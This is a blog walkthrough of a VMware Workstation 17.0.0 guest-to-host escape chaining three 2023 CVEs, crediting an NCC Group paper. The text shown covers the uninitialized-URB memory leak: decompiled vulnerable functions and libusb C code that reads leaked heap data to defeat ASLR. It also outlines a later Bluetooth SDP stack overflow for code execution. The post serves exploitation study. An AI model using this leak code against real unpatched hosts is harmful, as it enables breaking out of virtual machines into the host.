VMware Guest To Host

Posted Apr 4, 2026  Updated Apr 6, 2026

Preview Image

By r0keb

38 min read

Good morning! Today we’re going to walk through the complete process of creating a Guest-to-Host exploit in VMware (version 17.0.0). My setup is my laptop with this version installed, along with Ubuntu 20.04 LTS.



The exploits used are CVE-2023-20870, CVE-2023-34044, and CVE-2023-20869.



I did NOT discover these exploits (;(). In fact, there is a 107-page paper that explains these exploits in great detail:



https://www.nccgroup.com/media/b2chcbti/vmware-workstation-guest-to-host-escape.pdf

All credit goes to Alexander Zaviyalov for this great paper, which allowed me to use it as a guide when attempting to exploit these CVEs :D.



I should mention that this was a very fun and engaging process, as well as great training to understand the research and exploitation process of hypervisors (in this case VMware, but I’m planning to dig into Hyper-V as well).



The exploitation process is as follows:



Memory Leak: This will be very helpful for bypassing ASLR and obtaining the base address of vmware\_vmx. To achieve this, we will take advantage of a malloc with uninitialized memory in the USB Request Blocks (URBs).

RCE: We will trigger this with a stack-based buffer overflow in the Service Discovery Protocol (SDP) implementation. For this, we will need a Bluetooth device. In my case, I tried running a VM with Windows 11 using the vulnerable version of VMware alongside Ubuntu 20.04 LTS. Unfortunately, the Bluetooth device passthrough did not work properly, so I decided to perform it on my laptop’s host OS.

Now that the concept has been introduced, let’s get started.



Leak VMware Base address

For this leak, we’ll need two devices, the Virtual Bluetooth Adapter (reader) and the Virtual Mouse (writer).



Both, the mouse and the Bluetooth sides use malloc without zeroing. Neither one cleans up properly. But they play different roles.



Virtual Bluetooth Adapter (Reader)

First, we’re going to use lsusb to list the USB devices and note down the VID and PID: 



uint16\_t vid = 0x0e0f;

uint16\_t pid = 0x0008;

For this leak, we will use libusb in our code to send URB packets.



Let’s start from the beginning, the vulnerable function:



// Guest가  USB Request Block 을 전송할 경우 호출, 메모리 할당 및 read/write data

VUsbURB \*\_\_fastcall VUsbBluetooth\_OpNewUrb(VUsbDevice\_Bluetooth \*dev, unsigned int num\_pkts, unsigned int num\_bytes)

{

&#x20; \_QWORD \*v5; // rsi

&#x20; \_\_int64 v6; // rax



&#x20; v5 = UtilSafeMalloc1(12LL \* num\_pkts + 0xA0);

&#x20; v5\[0xF] = \&unk\_14132C238;

&#x20; v6 = sub\_14081BEA0(\*((\_QWORD \*)dev + 76), num\_bytes);

&#x20; \*v5 = v6;

&#x20; v5\[0x10] = sub\_1408194C0(v6);

&#x20; return (VUsbURB \*)(v5 + 1);

}

Everything revolves around this function, sub\_14081BEA0, which is a wrapper for:



\_\_int64 \_\_fastcall sub\_14081BEA0(\_\_int64 a1, \_\_int64 a2)

{

&#x20; return (\_\_int64)sub\_1408194D0(\*(\_DWORD \*\*)(a1 + 0x268), a2);

}

\_QWORD \*\_\_fastcall sub\_1408194D0(\_DWORD \*a1, unsigned int numbytes)

{

&#x20; \_QWORD \*v5; // rcx

&#x20; int v6; // edx

&#x20; unsigned int v7; // edx

&#x20; unsigned int v8; // r8d

&#x20; unsigned int v9; // eax

&#x20; bool v10; // cc

&#x20; unsigned int v11; // eax



&#x20; v5 = UtilSafeMalloc1(numbytes + 24LL);

&#x20; \*(\_WORD \*)v5 = 0;

&#x20; \*v5 = (unsigned \_\_int64)(numbytes \& 0xFFFFFF) << 16;

&#x20; v5\[1] = 0;

&#x20; v5\[2] = a1;

&#x20; v6 = a1\[16];

&#x20; ++a1\[14];

&#x20; v7 = numbytes + v6;

&#x20; v8 = a1\[14];

&#x20; v9 = a1\[15];

&#x20; a1\[16] = v7;

&#x20; v10 = v9 <= v8;

&#x20; if ( v9 >= v8 )

&#x20; {

&#x20;   if ( v7 <= a1\[17] )

&#x20;     return v5;

&#x20;   v10 = v9 <= v8;

&#x20; }

&#x20; if ( v10 )

&#x20;   v9 = v8;

&#x20; a1\[15] = v9;

&#x20; v11 = a1\[17];

&#x20; if ( v11 <= v7 )

&#x20;   v11 = v7;

&#x20; a1\[17] = v11;

&#x20; return v5;

}

As we can see, the memory is never initialized, therefore, as we will see next, there may be sensitive information in that buffer.



void \*\_\_cdecl UtilSafeMalloc1(size\_t Size)

{

&#x20; void \*result; // rax



&#x20; result = malloc(Size);

&#x20; if ( !result )

&#x20; {

&#x20;   if ( Size )

&#x20;     unknown\_libname\_45();

&#x20; }

&#x20; return result;

}

With the help of WinDBG, we’re going to observe the behavior in “real time”. 



We are going to do the following:



// declare context

&#x09;libusb\_context\* ctx = NULL;

&#x09;status = libusb\_init(\&ctx);

...

...

// open a device handle with the mentioned VID and PID

&#x09;libusb\_device\_handle \*hDevice = NULL;

&#x09;hDevice = libusb\_open\_device\_with\_vid\_pid(ctx, vid, pid);

...

...

// IMPORTANT: Detach the kernel driver attached to the driver

&#x09;status = libusb\_kernel\_driver\_active(hDevice, 0);

&#x09;if (status == 1) {

&#x09;	printf("\\n\[Dettaching kernel driver...]\\n");

&#x09;	libusb\_detach\_kernel\_driver(hDevice, 0);

&#x09;}

...

...

// Declare a buffer to get the output and send the libusb\_control\_transfer

&#x09;char\* dataOut\[0x1000];

&#x09;memset(dataOut, 0, 0x1000);

&#x09;status = libusb\_control\_transfer(hDevice, LIBUSB\_REQUEST\_TYPE\_CLASS | LIBUSB\_ENDPOINT\_IN, LIBUSB\_REQUEST\_GET\_STATUS, 0, 0, dataOut, 0x80, 1000);

...

...

// To get the output content of the buffer we got the next printf statement:

&#x09;for (unsigned int i = 0; i < 0x20; i++) {

&#x09;	printf("\\n\[%u] address -> 0x%p\\n\\t\\\\\_\_Content -> \[0x%0.16llx]\\n", i, (void\*)\&dataOut\[i], (unsigned long long)dataOut\[i]);

&#x09;}

...

...

// cleanup

&#x09;printf("\\n\[BUFFER SENT SUCCESSFULLY]\\n");



&#x09;libusb\_release\_interface(hDevice, 0);



&#x09;libusb\_close(hDevice);

&#x09;hDevice = NULL;



&#x09;libusb\_exit(ctx);

&#x09;ctx = NULL;

You might be wondering why we use LIBUSB\_REQUEST\_TYPE\_CLASS | LIBUSB\_ENDPOINT\_IN in the request\_type. Well, that’s a great question, since it’s the core of the leak, as well as the bRequest (LIBUSB\_REQUEST\_GET\_STATUS).



request\_type:

LIBUSB\_ENDPOINT\_IN: It sets the transfer direction to “device -> guest”, meaning the host will read from the URB data buffer and send it back to the guest OS. Without this, the data flows the other direction (guest writes to the device), and we’d never receive the uninitialized heap contents. The entire leak depends on getting data back.

